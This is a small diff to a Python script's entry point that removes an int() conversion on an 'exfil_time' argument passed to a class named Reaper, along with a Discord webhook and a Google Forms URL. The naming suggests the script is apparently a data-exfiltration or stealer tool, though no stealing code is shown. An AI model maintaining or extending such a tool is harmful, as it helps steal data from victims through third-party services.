@@ -146,7 +146,7 @@ if __name__ == "__main__":
         args = _args
 
     Reaper(
-        exfil_time=int(args.exfil_time),
+        exfil_time=args.exfil_time,
         discord_webhook=args.webhook,
         google_forms_url=args.forms
     ).execute()
